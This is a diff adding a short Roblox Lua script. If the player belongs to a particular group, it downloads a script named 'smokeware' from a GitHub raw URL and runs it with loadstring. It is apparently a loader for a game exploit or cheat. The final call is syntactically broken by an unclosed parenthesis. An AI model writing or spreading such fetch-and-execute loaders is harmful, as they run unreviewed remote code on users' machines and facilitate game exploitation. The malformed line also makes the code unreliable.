@@ -1,0 +1,5 @@
+local plr = game.Players.LocalPlayer
+
+if plr:IsInGroup(15029103) then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberCopLOL/smokeware/main/script"))(
+end
